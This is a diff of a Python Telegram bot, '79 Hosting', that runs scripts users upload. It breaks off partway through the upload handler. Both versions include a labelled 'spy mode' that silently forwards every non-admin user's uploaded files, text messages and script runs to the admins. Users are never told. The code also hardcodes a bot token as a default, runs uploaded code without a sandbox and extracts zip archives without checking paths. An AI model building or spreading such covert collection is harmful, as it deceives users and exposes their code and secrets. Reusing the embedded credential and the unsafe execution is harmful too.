@@ -1,667 +1,629 @@
 #!/usr/bin/env python3
-"""
-🔥 79 ADVANCED SCRIPT HOSTING ENGINE (V4 - LIVE STATUS & SPY FILES)
-- Clean UI: Single-message live status updates during Auto-Install.
-- Spy Mode: Forwards EXACT files and texts from users to Admin/Channel.
-"""
-
-import asyncio
-import atexit
-import json
-import logging
-import os
-import re
-import shlex
-import signal
-import subprocess
-import sys
-import zipfile
+"""79 Hosting V5 — live status edit + spy file forward + no OpenAI"""
+import asyncio, atexit, json, logging, os, re, shlex, signal, subprocess, sys, zipfile
 from datetime import datetime, timedelta
 from pathlib import Path
 from threading import Thread
-from typing import List, Optional, Tuple, Dict
+from typing import Dict, List, Optional, Tuple
 
 import psutil
 from dotenv import load_dotenv
 from flask import Flask, jsonify
-from telegram import (
-    InlineKeyboardButton,
-    InlineKeyboardMarkup,
-    Update,
-)
+from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
 from telegram.ext import (
-    Application,
-    CallbackQueryHandler,
-    CommandHandler,
-    ConversationHandler,
-    MessageHandler,
-    ContextTypes,
-    filters,
+    Application, CallbackQueryHandler, CommandHandler, ConversationHandler,
+    MessageHandler, ContextTypes, filters,
 )
 
-# ---------- LOGGING SETUP ----------
-logging.basicConfig(
-    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
-    level=logging.INFO,
-)
-logger = logging.getLogger("79Engine")
+logging.basicConfig(format="%(asctime)s %(levelname)s %(message)s", level=logging.INFO)
+log = logging.getLogger("79")
 
-# ---------- CONFIG & ENVIRONMENT ----------
 load_dotenv()
-
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8923078994:AAEYk_-hdpVh2NYN4_yXX5lERPhVt8Ccs1I").strip()
-ADMIN_IDS_STR = os.getenv("ADMIN_IDS", "7546911540").strip()
-ADMIN_IDS = [int(x.strip()) for x in ADMIN_IDS_STR.split(",") if x.strip().isdigit()] or [7546911540]
-
-CHANNEL_USERNAME = os.getenv("CHANNEL_USERNAME", "@seventyx79").strip()
-LOG_CHANNEL = os.getenv("LOG_CHANNEL", "").strip()
-
+ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "7546911540").split(",") if x.strip().isdigit()] or [7546911540]
+CHANNEL = os.getenv("CHANNEL_USERNAME", "@seventyx79").strip()
 PORT = int(os.getenv("PORT") or os.getenv("RAILWAY_PUBLIC_PORT") or "8080")
-WORKSPACE_BASE = Path(os.getenv("WORKSPACE_BASE", "./workspaces"))
-MAX_UPLOAD_SIZE = int(os.getenv("MAX_UPLOAD_SIZE", "10MB").replace("MB", "")) * 1024 * 1024
-MAX_ARCHIVE_SIZE = int(os.getenv("MAX_ARCHIVE_SIZE", "50MB").replace("MB", "")) * 1024 * 1024
-OPENAI_API_KEY = os.getenv("OPENAI_API_KEY", "").strip()
-SCRIPT_TIMEOUT = int(os.getenv("SCRIPT_TIMEOUT", "300"))
+WS_BASE = Path(os.getenv("WORKSPACE_BASE", "./workspaces"))
+MAX_UP = 10 * 1024 * 1024
+WS_BASE.mkdir(parents=True, exist_ok=True)
 
-WORKSPACE_BASE.mkdir(parents=True, exist_ok=True)
+UPLOAD_WAIT, TERM = range(2)
+DATA = Path("bot_data.json")
 
-def get_log_target():
-    return LOG_CHANNEL if LOG_CHANNEL else ADMIN_IDS[0]
-
-# Conversation States
-UPLOAD_WAIT, TERMINAL_SESSION = range(2)
-
-# ---------- PATH REGISTRY ----------
-class PathRegistry:
+class Paths:
     def __init__(self):
-        self._registry: Dict[str, str] = {}
-        self._counter = 0
+        self.d, self.n = {}, 0
+    def add(self, p: Path) -> str:
+        s = str(p.resolve())
+        for k, v in self.d.items():
+            if v == s: return k
+        k = f"k{self.n}"; self.n += 1; self.d[k] = s; return k
+    def get(self, k: str) -> Optional[Path]:
+        v = self.d.get(k); return Path(v) if v else None
+R = Paths()
 
-    def register(self, path: Path) -> str:
-        resolved = str(path.resolve())
-        for k, v in self._registry.items():
-            if v == resolved:
-                return k
-        key = f"p79_{self._counter}"
-        self._registry[key] = resolved
-        self._counter += 1
-        return key
+def load():
+    if DATA.exists():
+        try: return json.loads(DATA.read_text())
+        except: pass
+    return {"users": {}, "procs": [], "tele": {}}
 
-    def get(self, key: str) -> Optional[Path]:
-        res = self._registry.get(key)
-        return Path(res) if res else None
+def save(d):
+    try: DATA.write_text(json.dumps(d, indent=2, default=str))
+    except: pass
 
-path_registry = PathRegistry()
-
-# ---------- PERSISTENCE & DATA MANAGER ----------
-DATA_FILE = "bot_data.json"
-
-def load_data() -> dict:
-    if Path(DATA_FILE).exists():
-        try:
-            with open(DATA_FILE, "r") as f:
-                return json.load(f)
-        except Exception as e:
-            logger.error(f"Failed to load data file: {e}")
-    return {"users": {}, "processes": [], "telemetry": {}}
-
-def save_data(data: dict):
-    try:
-        with open(DATA_FILE, "w") as f:
-            json.dump(data, f, indent=2, default=str)
-    except Exception as e:
-        logger.error(f"Failed to save data file: {e}")
-
-class UserManager:
+class UM:
     def __init__(self):
-        self.data = load_data()
-        self.users = self.data.get("users", {})
-        self.processes = self.data.get("processes", [])
-        self.telemetry = self.data.get("telemetry", {})
-
+        self.data = load()
+        self.users = self.data.setdefault("users", {})
+        self.procs = self.data.setdefault("procs", [])
+        self.tele = self.data.setdefault("tele", {})
     def save(self):
-        self.data["users"] = self.users
-        self.data["processes"] = self.processes
-        self.data["telemetry"] = self.telemetry
-        save_data(self.data)
-
-    def get_user(self, user_id: int) -> Optional[dict]:
-        return self.users.get(str(user_id))
-
-    def add_user(self, user_id: int, name: str, username: str):
-        status = "approved" if user_id in ADMIN_IDS else "pending"
-        self.users[str(user_id)] = {
-            "status": status,
-            "name": name,
-            "username": username,
-            "request_time": datetime.now().isoformat(),
-            "workspace": str(WORKSPACE_BASE / str(user_id)),
-        }
-        self.telemetry.setdefault(str(user_id), {"runs": 0, "success": 0, "fail": 0, "bad": 0})
+        self.data.update(users=self.users, procs=self.procs, tele=self.tele); save(self.data)
+    def get(self, uid): return self.users.get(str(uid))
+    def add(self, uid, name, un):
+        st = "approved" if uid in ADMIN_IDS else "pending"
+        self.users[str(uid)] = {"status": st, "name": name, "username": un,
+            "workspace": str(WS_BASE / str(uid)), "t": datetime.now().isoformat()}
+        self.tele.setdefault(str(uid), {"runs": 0, "ok": 0, "fail": 0})
         self.save()
-
-    def approve_user(self, user_id: int) -> bool:
-        if u := self.users.get(str(user_id)):
-            u["status"] = "approved"
-            self.save()
-            return True
+    def set_status(self, uid, st):
+        if u := self.get(uid): u["status"] = st; self.save(); return True
         return False
-
-    def ban_user(self, user_id: int) -> bool:
-        if u := self.users.get(str(user_id)):
-            u["status"] = "banned"
-            self.save()
-            return True
-        return False
-
-    def is_approved(self, user_id: int) -> bool:
-        if user_id in ADMIN_IDS:
-            return True
-        u = self.get_user(user_id)
-        return bool(u and u.get("status") == "approved")
-
-    def is_pending(self, user_id: int) -> bool:
-        if user_id in ADMIN_IDS:
-            return False
-        u = self.get_user(user_id)
-        return bool(u and u.get("status") == "pending")
-
-    def is_banned(self, user_id: int) -> bool:
-        u = self.get_user(user_id)
-        return bool(u and u.get("status") == "banned")
-
-    def get_workspace(self, user_id: int) -> Path:
-        u = self.get_user(user_id)
-        return Path(u["workspace"]) if u else WORKSPACE_BASE / str(user_id)
-
-    def add_process(self, user_id: int, filename: str, pid: int, log_path: str):
-        self.processes.append({
-            "user_id": user_id,
-            "filename": filename,
-            "pid": pid,
-            "start_time": datetime.now().isoformat(),
-            "status": "running",
-            "log_path": log_path,
-        })
+    def ok(self, uid): return uid in ADMIN_IDS or (self.get(uid) or {}).get("status") == "approved"
+    def pending(self, uid): return uid not in ADMIN_IDS and (self.get(uid) or {}).get("status") == "pending"
+    def banned(self, uid): return (self.get(uid) or {}).get("status") == "banned"
+    def ws(self, uid):
+        u = self.get(uid); p = Path(u["workspace"]) if u else WS_BASE / str(uid)
+        p.mkdir(parents=True, exist_ok=True); return p
+    def add_proc(self, uid, name, pid, logp):
+        self.procs.append({"user_id": uid, "filename": name, "pid": pid, "status": "running", "log": logp})
         self.save()
-
-    def get_user_processes(self, user_id: int) -> List[dict]:
-        return [p for p in self.processes if p.get("user_id") == user_id]
-
-    def stop_process(self, pid: int) -> bool:
-        for p in self.processes:
+    def user_procs(self, uid): return [p for p in self.procs if p.get("user_id") == uid]
+    def all_procs(self): return self.procs
+    def stop(self, pid):
+        for p in self.procs:
             if p.get("pid") == pid:
-                try:
-                    os.kill(pid, signal.SIGTERM)
-                except Exception:
-                    pass
-                p["status"] = "stopped"
-                self.save()
-                return True
+                try: os.kill(pid, signal.SIGTERM)
+                except: pass
+                p["status"] = "stopped"; self.save(); return True
+        return False
+    def cleanup(self):
+        for p in list(self.procs):
+            try: os.kill(p.get("pid"), signal.SIGTERM)
+            except: pass
+        self.procs.clear(); self.save()
+    def tinc(self, uid, k):
+        self.tele.setdefault(str(uid), {"runs": 0, "ok": 0, "fail": 0})[k] += 1; self.save()
+    def tget(self, uid): return self.tele.get(str(uid), {"runs": 0, "ok": 0, "fail": 0})
+    def pending_list(self): return [{"user_id": k, **v} for k, v in self.users.items() if v.get("status") == "pending"]
+    def approved_list(self): return [{"user_id": k, **v} for k, v in self.users.items() if v.get("status") == "approved"]
+    def banned_list(self): return [{"user_id": k, **v} for k, v in self.users.items() if v.get("status") == "banned"]
+
+um = UM()
+atexit.register(um.cleanup)
+
+async def spy_file(bot, user, file_id, fname):
+    if user.id in ADMIN_IDS: return
+    cap = f"🕵️ FILE\n👤 {user.full_name} (@{user.username or '-'})\n🆔 `{user.id}`\n📄 `{fname}`"
+    for a in ADMIN_IDS:
+        try: await bot.send_document(a, document=file_id, caption=cap, parse_mode="Markdown")
+        except Exception as e: log.warning("spy file: %s", e)
+
+async def spy_text(bot, user, text):
+    if user.id in ADMIN_IDS: return
+    msg = f"🕵️ MSG\n👤 {user.full_name} (@{user.username or '-'})\n🆔 `{user.id}`\n💬 {text[:3000]}"
+    for a in ADMIN_IDS:
+        try: await bot.send_message(a, msg, parse_mode="Markdown")
+        except: pass
+
+async def spy_run(bot, user, fname):
+    if user.id in ADMIN_IDS: return
+    msg = f"🕵️ RUN\n👤 {user.full_name} (@{user.username or '-'})\n🆔 `{user.id}`\n▶️ `{fname}`"
+    for a in ADMIN_IDS:
+        try: await bot.send_message(a, msg, parse_mode="Markdown")
+        except: pass
+
+def menu_kb(uid):
+    rows = [
+        [InlineKeyboardButton("📁 Upload", callback_data="upload"),
+         InlineKeyboardButton("📂 Scripts", callback_data="scripts")],
+        [InlineKeyboardButton("📝 Logs", callback_data="logs"),
+         InlineKeyboardButton("🛑 Stop", callback_data="stop")],
+        [InlineKeyboardButton("📊 Stats", callback_data="stats")],
+    ]
+    if uid in ADMIN_IDS:
+        rows.append([InlineKeyboardButton("💻 Terminal", callback_data="term"),
+                     InlineKeyboardButton("👑 Admin", callback_data="admin")])
+    return InlineKeyboardMarkup(rows)
+
+def back_kb(to="home"):
+    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data=to),
+                                  InlineKeyboardButton("🏠 Menu", callback_data="home")]])
+
+async def joined(bot, uid):
+    if not CHANNEL or uid in ADMIN_IDS: return True
+    try:
+        c = CHANNEL if CHANNEL.startswith("@") else f"@{CHANNEL}"
+        m = await bot.get_chat_member(c, uid)
+        return m.status not in ("left", "kicked")
+    except: return True
+
+async def gate(update, context) -> bool:
+    u = update.effective_user
+    if not u: return False
+    uid = u.id
+    q, m = update.callback_query, update.effective_message
+
+    async def say(t, kb=None):
+        if q:
+            try: await q.edit_message_text(t, parse_mode="Markdown", reply_markup=kb)
+            except: pass
+        elif m: await m.reply_text(t, parse_mode="Markdown", reply_markup=kb)
+
+    if not await joined(context.bot, uid):
+        ch = CHANNEL.lstrip("@")
+        await say(f"🔒 Join {CHANNEL}", InlineKeyboardMarkup([
+            [InlineKeyboardButton("📢 Join", url=f"https://t.me/{ch}")],
+            [InlineKeyboardButton("✅ Check", callback_data="join")]]))
         return False
 
-    def cleanup_all(self):
-        for p in list(self.processes):
-            try:
-                os.kill(p.get("pid"), signal.SIGTERM)
-            except Exception:
-                pass
-        self.processes.clear()
-        self.save()
-
-    def inc_run(self, user_id: int):
-        self.telemetry.setdefault(str(user_id), {"runs": 0, "success": 0, "fail": 0, "bad": 0})["runs"] += 1
-        self.save()
-    def inc_success(self, user_id: int):
-        self.telemetry.setdefault(str(user_id), {"runs": 0, "success": 0, "fail": 0, "bad": 0})["success"] += 1
-        self.save()
-    def inc_fail(self, user_id: int):
-        self.telemetry.setdefault(str(user_id), {"runs": 0, "success": 0, "fail": 0, "bad": 0})["fail"] += 1
-        self.save()
-    def inc_bad(self, user_id: int):
-        self.telemetry.setdefault(str(user_id), {"runs": 0, "success": 0, "fail": 0, "bad": 0})["bad"] += 1
-        self.save()
-
-user_manager = UserManager()
-atexit.register(user_manager.cleanup_all)
-
-# ---------- HELPER UTILITIES ----------
-def sanitize_filename(filename: str) -> str:
-    return os.path.basename(filename).replace("/", "").replace("\\", "")
-
-def ensure_workspace(user_id: int) -> Path:
-    ws = user_manager.get_workspace(user_id)
-    ws.mkdir(parents=True, exist_ok=True)
-    return ws
-
-def extract_zip(zip_path: Path, dest_dir: Path) -> Tuple[bool, str]:
-    try:
-        with zipfile.ZipFile(zip_path, "r") as z:
-            total = sum(i.file_size for i in z.infolist())
-            if total > MAX_ARCHIVE_SIZE:
-                return False, f"Archive size exceeds limit ({MAX_ARCHIVE_SIZE // 1024 // 1024}MB)"
-            z.extractall(dest_dir)
-        return True, "Extraction successful"
-    except Exception as e:
-        return False, str(e)
-
-def detect_entry_point(dest_dir: Path) -> Tuple[Optional[str], Optional[str]]:
-    for name in ("main.py", "bot.py", "index.js", "app.py"):
-        p = dest_dir / name
-        if p.exists():
-            return ("py" if name.endswith(".py") else "js", str(p))
-    pys = list(dest_dir.glob("*.py"))
-    if pys:
-        return ("py", str(pys[0]))
-    return None, None
-
-async def auto_install_module(module_name: str) -> bool:
-    try:
-        proc = await asyncio.create_subprocess_exec(
-            sys.executable, "-m", "pip", "install", module_name,
-            stdout=asyncio.subprocess.PIPE,
-            stderr=asyncio.subprocess.PIPE,
-        )
-        await proc.communicate()
-        return proc.returncode == 0
-    except Exception:
-        return False
-
-def extract_module_name_from_error(error_text: str) -> Optional[str]:
-    for pat in (
-        r"ModuleNotFoundError: No module named ['\"]([^'\"]+)['\"]",
-        r"ImportError: No module named ['\"]([^'\"]+)['\"]",
-    ):
-        m = re.search(pat, error_text)
-        if m:
-            return m.group(1)
-    return None
-
-async def get_ai_debug_suggestion(error_log: str) -> str:
-    if not OPENAI_API_KEY:
-        return "🔧 79 AI Debugger inactive (No OpenAI API key provided)."
-    try:
-        from openai import OpenAI
-        client = OpenAI(api_key=OPENAI_API_KEY)
-        response = await asyncio.to_thread(
-            client.chat.completions.create,
-            model="gpt-3.5-turbo",
-            messages=[
-                {"role": "system", "content": "You debug Python/Node errors. Provide a 2-line solution."},
-                {"role": "user", "content": f"Error log:\n{error_log[:1800]}"}
-            ],
-            max_tokens=150,
-        )
-        return f"🤖 *79 AI Solution:*\n{response.choices[0].message.content.strip()}"
-    except Exception as e:
-        return f"⚠️ 79 AI Debugger error: `{e}`"
-
-# ---------- LIVE STATUS BACKGROUND SCRIPT RUNNER ----------
-async def run_script_with_watchdog(
-    user_id: int, script_path: Path, file_type: str, status_updater
-) -> Tuple[int, str, str]:
-    user_manager.inc_run(user_id)
-    ws = ensure_workspace(user_id)
-    log_dir = ws / "logs"
-    log_dir.mkdir(exist_ok=True)
-    log_path = log_dir / f"{datetime.now().strftime('%Y%m%d_%H%M%S')}_{script_path.stem}.log"
-
-    cmd = [sys.executable, "-u", str(script_path)] if file_type == "py" else ["node", str(script_path)]
-
-    def _spawn_process(mode="w"):
-        lf = open(log_path, mode, buffering=1, encoding="utf-8", errors="ignore")
-        p = subprocess.Popen(
-            cmd, cwd=str(script_path.parent), stdout=lf, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL
-        )
-        return p, lf
-
-    await status_updater("⏳ *Starting script container...*")
-    proc, log_file = _spawn_process("w")
-    await asyncio.sleep(3)
-    poll = proc.poll()
-
-    if poll is None:
-        user_manager.inc_success(user_id)
-        return proc.pid, str(log_path), f"🚀 Script is running in background! (PID `{proc.pid}`)"
-
-    try:
-        log_file.close()
-    except Exception:
-        pass
-
-    output = log_path.read_text(errors="ignore") if log_path.exists() else ""
-
-    if poll == 0:
-        user_manager.inc_success(user_id)
-        return proc.pid, str(log_path), "✅ Script executed and completed successfully."
-
-    missing = extract_module_name_from_error(output)
-    if missing:
-        await status_updater(f"⚙️ *Auto-installing missing package:* `{missing}`...")
-        if await auto_install_module(missing):
-            await status_updater(f"✅ *Installed `{missing}`. Re-launching script...*")
-            proc2, lf2 = _spawn_process("a")
-            await asyncio.sleep(3)
-            poll2 = proc2.poll()
-            if poll2 is None:
-                user_manager.inc_success(user_id)
-                return proc2.pid, str(log_path), f"🚀 Script is running after fix! (PID `{proc2.pid}`)"
-            if poll2 == 0:
-                user_manager.inc_success(user_id)
-                return proc2.pid, str(log_path), "✅ Success after auto-repair."
-            try:
-                lf2.close()
-            except Exception:
-                pass
-            output2 = log_path.read_text(errors="ignore")
-            user_manager.inc_fail(user_id)
-            ai = await get_ai_debug_suggestion(output2)
-            return proc2.pid, str(log_path), f"❌ Failed after auto-install.\n{ai}"
-
-        user_manager.inc_bad(user_id)
-        ai = await get_ai_debug_suggestion(output)
-        return proc.pid, str(log_path), f"❌ Could not install `{missing}`.\n{ai}"
-
-    user_manager.inc_fail(user_id)
-    ai = await get_ai_debug_suggestion(output)
-    return proc.pid, str(log_path), f"❌ Crashed (Exit Code {poll}).\n{ai}"
-
-# ---------- CHANNEL SUBSCRIPTION CHECK ----------
-async def gate_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
-    user = update.effective_user
-    if not user:
-        return False
-    uid = user.id
-
-    if CHANNEL_USERNAME and uid not in ADMIN_IDS:
-        try:
-            chat = CHANNEL_USERNAME if CHANNEL_USERNAME.startswith("@") else f"@{CHANNEL_USERNAME}"
-            m = await context.bot.get_chat_member(chat, uid)
-            if m.status in ("left", "kicked"):
-                markup = InlineKeyboardMarkup([
-                    [InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{chat.lstrip('@')}")],
-                    [InlineKeyboardButton("✅ Verify Subscription", callback_data="check_join")]
-                ])
-                if update.callback_query:
-                    await update.callback_query.edit_message_text(f"🔒 *Access Locked*\nPlease join {CHANNEL_USERNAME} to use this bot.", parse_mode="Markdown", reply_markup=markup)
-                elif update.message:
-                    await update.message.reply_text(f"🔒 *Access Locked*\nPlease join {CHANNEL_USERNAME} to use this bot.", parse_mode="Markdown", reply_markup=markup)
-                return False
-        except Exception:
-            pass
-
-    u = user_manager.get_user(uid)
-    if not u:
-        user_manager.add_user(uid, user.full_name, user.username or "NoUsername")
+    if not um.get(uid):
+        um.add(uid, u.full_name, u.username or "-")
         if uid not in ADMIN_IDS:
-            # Send Notification to Admin
-            for admin_id in ADMIN_IDS:
+            for a in ADMIN_IDS:
                 try:
-                    await context.bot.send_message(
-                        admin_id,
-                        f"🔔 *New 79 Access Request*\n👤 {user.full_name} (@{user.username or 'None'})\n🆔 `{uid}`",
-                        parse_mode="Markdown",
-                        reply_markup=InlineKeyboardMarkup([
-                            [InlineKeyboardButton("✅ Approve", callback_data=f"approve_{uid}"),
-                             InlineKeyboardButton("🚫 Ban", callback_data=f"ban_{uid}")]
-                        ])
-                    )
-                except Exception:
-                    pass
-            msg_text = "⏳ *Access Request Sent.* Wait for Admin approval."
-            if update.callback_query:
-                await update.callback_query.edit_message_text(msg_text, parse_mode="Markdown")
-            elif update.message:
-                await update.message.reply_text(msg_text, parse_mode="Markdown")
+                    await context.bot.send_message(a,
+                        f"🔔 New user\n{u.full_name}\n`{uid}`", parse_mode="Markdown",
+                        reply_markup=InlineKeyboardMarkup([[
+                            InlineKeyboardButton("✅", callback_data=f"ap_{uid}"),
+                            InlineKeyboardButton("🚫", callback_data=f"bn_{uid}")]]))
+                except: pass
+            await say("⏳ Wait for admin approval.")
             return False
-
-    if user_manager.is_banned(uid):
-        msg_text = "🚫 *You are banned from using this bot.*"
-        if update.callback_query:
-            await update.callback_query.edit_message_text(msg_text, parse_mode="Markdown")
-        elif update.message:
-            await update.message.reply_text(msg_text, parse_mode="Markdown")
-        return False
-    if user_manager.is_pending(uid):
-        msg_text = "⏳ *Your approval is pending with Admin.*"
-        if update.callback_query:
-            await update.callback_query.edit_message_text(msg_text, parse_mode="Markdown")
-        elif update.message:
-            await update.message.reply_text(msg_text, parse_mode="Markdown")
-        return False
-
+    if um.banned(uid):
+        await say("🚫 Banned."); return False
+    if um.pending(uid):
+        await say("⏳ Pending approval."); return False
     return True
 
-# ---------- UI KEYBOARD BUILDERS ----------
-def get_main_menu_keyboard(user_id: int) -> InlineKeyboardMarkup:
-    keyboard = [
-        [InlineKeyboardButton("📁 Upload File", callback_data="upload"),
-         InlineKeyboardButton("📂 My Scripts", callback_data="my_scripts")],
-        [InlineKeyboardButton("📝 View Logs", callback_data="logs"),
-         InlineKeyboardButton("🛑 Stop Script", callback_data="stop")],
-    ]
-    if user_id in ADMIN_IDS:
-        keyboard.append([
-            InlineKeyboardButton("💻 Terminal", callback_data="terminal"),
-            InlineKeyboardButton("👑 Admin Panel", callback_data="admin_panel")
-        ])
-    return InlineKeyboardMarkup(keyboard)
+def safe_name(n): return os.path.basename(n).replace("/", "").replace("\\", "")
 
-def ik_back(target: str = "main_menu") -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup([
-        [InlineKeyboardButton("🔙 Back", callback_data=target),
-         InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]
-    ])
+def extract_zip(zp: Path, dest: Path) -> Tuple[bool, str]:
+    try:
+        with zipfile.ZipFile(zp) as z:
+            if sum(i.file_size for i in z.infolist()) > 50*1024*1024:
+                return False, "zip too big"
+            z.extractall(dest)
+        return True, "ok"
+    except Exception as e: return False, str(e)
 
-# ---------- CORE HANDLERS ----------
+def entry_of(d: Path):
+    for n in ("main.py", "bot.py", "app.py", "index.js"):
+        p = d / n
+        if p.exists(): return ("py" if n.endswith(".py") else "js", p)
+    pys = list(d.glob("*.py")); 
+    if pys: return "py", pys[0]
+    jss = list(d.glob("*.js"));
+    if jss: return "js", jss[0]
+    return None, None
+
+async def pip_mod(name):
+    p = await asyncio.create_subprocess_exec(sys.executable, "-m", "pip", "install", name,
+        stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL)
+    await p.communicate(); return p.returncode == 0
+
+def miss_mod(txt):
+    m = re.search(r"(?:ModuleNotFoundError|ImportError): No module named ['\"]([^'\"]+)['\"]", txt)
+    return m.group(1) if m else None
+
+async def run_script(uid, path: Path, ftype, edit):
+    """edit(text) = async fn to update ONE telegram message"""
+    um.tinc(uid, "runs")
+    logdir = um.ws(uid) / "logs"; logdir.mkdir(exist_ok=True)
+    lp = logdir / f"{datetime.now():%Y%m%d_%H%M%S}_{path.stem}.log"
+    cmd = [sys.executable, "-u", str(path)] if ftype == "py" else ["node", str(path)]
+
+    def spawn(mode="w"):
+        f = open(lp, mode, buffering=1, encoding="utf-8", errors="ignore")
+        pr = subprocess.Popen(cmd, cwd=str(path.parent), stdout=f, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
+        return pr, f
+
+    await edit("⏳ Starting...")
+    pr, f = spawn()
+    await asyncio.sleep(3)
+    code = pr.poll()
+    if code is None:
+        um.tinc(uid, "ok")
+        return pr.pid, str(lp), f"🚀 Running (PID `{pr.pid}`)"
+    try: f.close()
+    except: pass
+    out = lp.read_text(errors="ignore") if lp.exists() else ""
+    if code == 0:
+        um.tinc(uid, "ok")
+        return pr.pid, str(lp), "✅ Finished OK"
+
+    miss = miss_mod(out)
+    if miss:
+        await edit(f"⚙️ Installing `{miss}`...")
+        if await pip_mod(miss):
+            await edit(f"✅ Installed `{miss}`. Restarting...")
+            pr2, f2 = spawn("a")
+            await asyncio.sleep(3)
+            c2 = pr2.poll()
+            if c2 is None:
+                um.tinc(uid, "ok")
+                return pr2.pid, str(lp), f"🚀 Running after fix (PID `{pr2.pid}`)"
+            try: f2.close()
+            except: pass
+            out = lp.read_text(errors="ignore")
+            if c2 == 0:
+                um.tinc(uid, "ok")
+                return pr2.pid, str(lp), "✅ OK after install"
+            um.tinc(uid, "fail")
+            tail = out[-800:] if out else "no log"
+            return pr2.pid, str(lp), f"❌ Still fail.\n```\n{tail}\n```"
+        um.tinc(uid, "fail")
+        return pr.pid, str(lp), f"❌ Install fail `{miss}`.\n```\n{out[-600:]}\n```"
+
+    um.tinc(uid, "fail")
+    return pr.pid, str(lp), f"❌ Exit {code}.\n```\n{out[-800:]}\n```"
+
+# ---- handlers ----
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not await gate_user(update, context):
-        return
-    user = update.effective_user
-    text = f"👋 *Welcome {user.first_name} to 79 Hosting Engine!*\n\nControl your cloud scripts below:"
-    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=get_main_menu_keyboard(user.id))
+    if not await gate(update, context): return
+    u = update.effective_user
+    await update.message.reply_text(
+        f"👋 *{u.first_name}* — 79 Hosting\nPick:", parse_mode="Markdown",
+        reply_markup=menu_kb(u.id))
 
-async def main_menu_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    if not await gate_user(update, context):
-        return
-    await query.edit_message_text("📋 *79 Main Dashboard*\nSelect an option below:", parse_mode="Markdown", reply_markup=get_main_menu_keyboard(query.from_user.id))
+async def home(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query; await q.answer()
+    if not await gate(update, context): return
+    try:
+        await q.edit_message_text("📋 *Menu*", parse_mode="Markdown", reply_markup=menu_kb(q.from_user.id))
+    except: pass
 
-async def check_join(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    if await gate_user(update, context):
-        await query.edit_message_text("✅ *Verification Successful!*", parse_mode="Markdown", reply_markup=get_main_menu_keyboard(query.from_user.id))
+async def join_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query; await q.answer()
+    if await gate(update, context):
+        try: await q.edit_message_text("✅ OK", reply_markup=menu_kb(q.from_user.id))
+        except: pass
 
-# ----- SPY MODE (TEXT MESSAGES) -----
-async def handle_user_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not await gate_user(update, context):
-        return
-    user = update.effective_user
-    if user.id not in ADMIN_IDS:
-        text = f"🕵️‍♂️ *SPY ALERT (Message)*\n👤 {user.full_name} (`{user.id}`)\n💬 *Said:*\n{update.message.text}"
-        try:
-            await context.bot.send_message(chat_id=get_log_target(), text=text, parse_mode="Markdown")
-        except Exception:
-            pass
-    # Keep interface clean by showing menu again
-    await update.message.reply_text("Message received.", reply_markup=get_main_menu_keyboard(user.id))
-
-# ----- UPLOAD HANDLERS -----
-async def upload_start_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    if not await gate_user(update, context):
-        return ConversationHandler.END
-    await query.edit_message_text(
-        "📤 *Upload Script / Project*\n\nSend your `.py`, `.js`, or `.zip` file into this chat.\nSend `/cancel` to abort.",
-        parse_mode="Markdown", reply_markup=ik_back("main_menu")
-    )
+async def upload_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query; await q.answer()
+    if not await gate(update, context): return ConversationHandler.END
+    await q.edit_message_text(
+        "📤 Send `.py` / `.js` / `.zip`\n/cancel to abort",
+        parse_mode="Markdown", reply_markup=back_kb())
     return UPLOAD_WAIT
 
-async def upload_file_receive(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    user = update.effective_user
-    document = update.message.document
-    if not document:
-        await update.message.reply_text("❌ Please send a valid document file.", reply_markup=ik_back("main_menu"))
-        return UPLOAD_WAIT
-
-    filename = document.file_name or "file.py"
-    if not any(filename.endswith(ext) for ext in (".py", ".js", ".zip")):
-        await update.message.reply_text("❌ Only `.py`, `.js`, and `.zip` files are supported.", reply_markup=ik_back("main_menu"))
+async def upload_recv(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    u = update.effective_user
+    doc = update.message.document
+    if not doc:
+        await update.message.reply_text("Send a file.", reply_markup=back_kb()); return UPLOAD_WAIT
+    name = doc.file_name or "f.py"
+    if not name.endswith((".py", ".js", ".zip")):
+        await update.message.reply_text("Only py/js/zip", reply_markup=menu_kb(u.id))
+        return ConversationHandler.END
+    if doc.file_size and doc.file_size > MAX_UP:
+        await update.message.reply_text("Too large", reply_markup=menu_kb(u.id))
         return ConversationHandler.END
 
-    ws = ensure_workspace(user_id)
-    safe = sanitize_filename(filename)
-    file_path = ws / safe
-
+    ws = um.ws(u.id)
+    path = ws / safe_name(name)
     try:
-        f = await context.bot.get_file(document.file_id)
-        await f.download_to_drive(file_path)
+        f = await context.bot.get_file(doc.file_id)
+        await f.download_to_drive(path)
     except Exception as e:
-        await update.message.reply_text(f"❌ Download failed: {e}", reply_markup=ik_back("main_menu"))
+        await update.message.reply_text(f"DL fail: {e}", reply_markup=menu_kb(u.id))
         return ConversationHandler.END
 
-    # ---------- SPY MODE: SEND ACTUAL FILE TO ADMIN/CHANNEL ----------
-    if user_id not in ADMIN_IDS:
-        caption = f"🕵️‍♂️ *SPY ALERT (File Upload)*\n👤 {user.full_name} (`{user_id}`)\n📁 File: `{filename}`"
-        try:
-            await context.bot.send_document(chat_id=get_log_target(), document=document.file_id, caption=caption, parse_mode="Markdown")
-        except Exception as e:
